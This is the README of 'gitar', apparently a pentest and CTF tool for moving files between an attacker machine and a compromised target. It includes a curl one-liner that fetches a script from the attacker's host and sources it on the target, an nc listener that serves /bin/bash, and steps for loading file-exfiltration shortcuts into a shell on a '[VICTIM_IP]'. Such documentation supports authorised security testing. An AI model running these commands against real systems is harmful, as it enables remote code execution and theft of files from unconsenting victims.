<div align=center>
<h1>gitar</h1>
<img src=https://github.com/ariary/gitar/blob/main/img/gitar-logo.png width=150>
	
<strong>📡 A more sophisticated python HTTP server sibling <br>🎸 with even simpler interactions for file exchange (Pentest/CTF) </strong>
<br>
</div>

|![demo](https://github.com/ariary/gitar/blob/main/img/gitar-demo.gif)|
|:---:|
|**~>** Have the  ***simplest possible shortcuts*** to upload/download file to/from the target machine<br>**~>** ***No installation needed*** on target machine<br>**~>** ***Fast and simple*** deployment|



## TL;DR *- and listen music*

On my target machine:
 - **Download a file** from my attacker machine: `pull [file]`
 - **Download a directory** from my attacker machine: `pullr [directory]`
 - **Upload a file** to my attacker machine: `push [file]`
 - **Upload a directory** to my attacker machine: `pushr [directory]`

*Before be able to use these shortcut you have to [set up](#set-up) both machines. Once again, the aim is to made it as simple as possible*

## Set up

***~>*** To make **set up even simpler** shortcut/aliases are a great benefit. See [them 💥](https://github.com/ariary/bang/blob/main/README.md#gitar-pentest-easy-file-sharing)

### Pre-requisites

* HTTP Network connectivity between attacker & target machines
* On target machine: `curl` 
	* `tar` for directory upload 
* On attacker machine: 
	* `xclip` to copy command on clipboard (not required)
	* `tree`: to expose it trough server (not required)

The aim is to keep "target requirements" as fit as possible. Attacker machine requirements are not a big deal as we have plenty control over it and time to configure it.

### Launch `gitar` server 
 
#### (Attacker machine)

Launch `gitar` server: 
```shell
gitar -e [server_reachable_ip]
```

#### (Target machine)

Get shortcuts and source them. The one-liner corresponding is by default copy on clipboard. It is also provided by step 1. (in gitar output):
```shell
curl -s http://[attacker_ip:port]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias
```

**And that's all, you can now `push` or `pull` file [🎶](#tldr---and-listen-music)**

 [`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files)

### Secure launch of `gitar` server

 
This is basicaly the same as launching `gitar` server. But as we expose our http server we become the prey. Hence we must harden a bit the server. To do this we launch `gitar` inside a container and use HTTPS.

* To enable HTTPS you must have certificates. Generate them with `generate.sh`.
* To use container image, you have to built it from ` Dockerfile`: `make build.image-gitar`

The following steps expose files of current directory. Files uploaded by remote are written inside current directory also.
#### (Attacker machine)

Launch `gitar` server: 
```shell
docker run --rm --cap-drop=all --cap-add=dac_override -v "${PWD}:/app/upload" -v "${HOME}/.gitar/certs/:/certs:ro" -v "${PWD}:/app/download" -p 9237:9237 gitar -copy=false -u /app/upload -d /app/download -tls=true -c /certs
```

#### (Target machine)

Get shortcuts and source them. The one-liner corresponding is in the container stdout.

**You can now `push`or `pull` file being more safe [🎶](#tldr---and-listen-music)**

[`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files-safely)

### Load shortcut directly in your reverse shell

**~>** *Below are the steps to have shortcuts directly embedded in your `nc` reverse shell*

#### (Target machine)

Launch your classic listener:
```shell
nc -nvlp 4444 -e /bin/bash
```

#### (Attacker machine)

1. Launch `gitar`server : `gitar -e [server_reachable_ip]` *(By default this will copy on clipboard the command to set up gitar exchange, also available in server output)*
2. Connect to the reverse shell + load shortcut within:`nc [VICTIM_IP] 4444` then `[CTRL+V]` 

An alternative is `export CMD=[CTRL+V] && (echo $CMD && cat) | nc [VICTIM_IP] 4444` *(Note: with `cat` you will not benefit of bash completion)*

**And enjoy you revshell [🎶](#tldr---and-listen-music)**

## Enhancement 🛣️

**~>** *All improvements must keep `gitar` simple and don't add unlikely pre-requisites (especially for the target machine)*

**Useful cause we will expose our http server and thus we become the prey**
- Hardening container image (use a non-root user, but in same time we have to be able to read/write from host volumes)
- HTTPS, basic authent (for the file server part)

**Improve UX**
- Handle case when curl isn't on target machine (wget version?) *Proposal: flag `method` (default curl), will determine the handler "alias" and adapt it in function (wget and Invoke-Webquest)
- An option to directly launch the reverse shell session with shortcut from `gitar`
- Soft to workaround limit due to `cat` use for reverse shell connection => autocompletion in reverse shell will not work as we have a pipe not a terminal. (To solve the pb we must have a prgm that creates a pseudoterminal, spawns a program connected to this pseudoterminal [see](https://stackoverflow.com/questions/5843741/how-can-i-pipe-initial-input-into-process-which-will-then-be-interactive) )


<div align=center><img src="https://github.com/ariary/gitar/blob/main/img/gitar-small.png"><div>
	
	
